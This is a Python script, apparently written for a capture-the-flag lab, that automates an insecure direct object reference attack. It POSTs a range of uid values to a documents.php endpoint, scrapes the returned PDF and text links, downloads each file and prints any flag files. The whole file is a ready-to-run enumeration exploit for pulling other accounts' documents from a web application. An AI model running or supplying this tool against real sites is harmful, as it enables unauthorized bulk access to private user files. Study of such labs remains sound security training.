#!/usr/bin/env python3
"""
IDOR enumeration helper (Python)

Usage:
    python3 idor_enum.py http://TARGET:PORT --start 1 --end 20 --outdir downloads

What it does:
- POSTs uid values in the given range to /documents.php
- extracts /documents/*.pdf and /documents/*.txt links from the response
- downloads each file (resuming if already present)
- prints the first 200 lines of any .txt file found

This is the Python equivalent of the bash script in this folder.
"""

import argparse
import os
import re
import sys
import requests
from urllib.parse import urljoin, urlparse
from pathlib import Path


USER_AGENT = "Mozilla/5.0 (X11; Linux x86_64) Python/idorenum"
TIMEOUT = 10


def extract_links(html_text):
    # find links like /documents/Invoice_1_09_2021.pdf or /documents/foo.txt
    # allow quoted/unquoted and avoid matching html attributes badly
    matches = re.findall(r'(/documents/[^\s"\'\">]+?\.(?:pdf|txt))', html_text, re.I)
    # normalize (remove trailing punctuation)
    cleaned = []
    for m in matches:
        # strip trailing characters often included by HTML parsing mistakes
        m = m.rstrip(')\'\".,;')
        cleaned.append(m)
    return sorted(set(cleaned), key=cleaned.index)


def safe_filename_from_cd(cd, fallback_url):
    """Parse content-disposition header to get filename, otherwise use basename of url."""
    if not cd:
        return Path(urlparse(fallback_url).path).name
    m = re.search(r'filename\*?=(?:UTF-8'')?"?([^";]+)"?', cd)
    if m:
        return os.path.basename(m.group(1))
    return Path(urlparse(fallback_url).path).name


def download_file(url, outdir):
    headers = {"User-Agent": USER_AGENT}
    try:
        with requests.get(url, headers=headers, stream=True, timeout=TIMEOUT, allow_redirects=True) as r:
            r.raise_for_status()
            cd = r.headers.get('content-disposition')
            filename = safe_filename_from_cd(cd, r.url)
            outpath = Path(outdir) / filename
            # stream to file (support resume by writing append if exists)
            mode = 'ab' if outpath.exists() else 'wb'
            with open(outpath, mode) as fh:
                for chunk in r.iter_content(chunk_size=8192):
                    if chunk:
                        fh.write(chunk)
            return outpath
    except Exception as e:
        print(f" [!] download failed for {url}: {e}", file=sys.stderr)
        return None


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('base_url', help='Base URL (e.g. http://10.0.0.5:8080)')
    parser.add_argument('--start', type=int, default=1, help='Start UID (inclusive)')
    parser.add_argument('--end', type=int, default=20, help='End UID (inclusive)')
    parser.add_argument('--outdir', default='downloads', help='Directory to save files')
    parser.add_argument('--path', default='/documents.php', help='Path to POST to (default: /documents.php)')
    args = parser.parse_args()

    base_url = args.base_url.rstrip('/')
    outdir = Path(args.outdir)
    outdir.mkdir(parents=True, exist_ok=True)

    headers = {"User-Agent": USER_AGENT}

    print("IDOR enumeration, POST request method")

    for uid in range(args.start, args.end + 1):
        print(f"--> uid {uid}")
        post_url = urljoin(base_url + '/', args.path.lstrip('/'))
        try:
            r = requests.post(post_url, data={'uid': uid}, headers=headers, timeout=TIMEOUT)
            # don't raise here - non-200 may still contain links
        except requests.RequestException as e:
            print(f" [!] Request failed for uid={uid}: {e}", file=sys.stderr)
            continue

        links = extract_links(r.text)
        if not links:
            # no links for this uid
            continue

        for link in links:
            print(f" Found: {link}")
            file_url = urljoin(base_url + '/', link.lstrip('/'))
            # If link looks like a flag file (flag_*.txt) fetch and print it immediately
            is_flag = re.search(r'/documents/flag_[^/]+\.txt$', link, re.I) or Path(link).name.lower().startswith('flag_') and Path(link).suffix.lower() == '.txt'
            if is_flag:
                try:
                    r2 = requests.get(file_url, headers=headers, timeout=TIMEOUT)
                    r2.raise_for_status()
                    fname = Path(link).name
                    print(f" [FLAG] {fname}")
                    # save to outdir
                    outpath = Path(outdir) / fname
                    with open(outpath, 'wb') as fh:
                        fh.write(r2.content)
                    # print first 200 lines
                    lines = r2.text.splitlines()
                    for i, l in enumerate(lines):
                        print(l)
                        if i >= 199:
                            break
                except Exception as e:
                    print(f" [!] Failed to fetch/print flag {file_url}: {e}", file=sys.stderr)
                # continue to next link
                continue

            # Otherwise download normally
            outpath = download_file(file_url, outdir)
            if outpath and outpath.suffix.lower() == '.txt':
                print(f" flag: {outpath.name}")
                try:
                    with open(outpath, 'r', encoding='utf-8', errors='replace') as fh:
                        for i, line in enumerate(fh):
                            print(line.rstrip('\n'))
                            if i >= 199:
                                break
                except Exception as e:
                    print(f" [!] Failed to read {outpath}: {e}", file=sys.stderr)


if __name__ == '__main__':
    main()
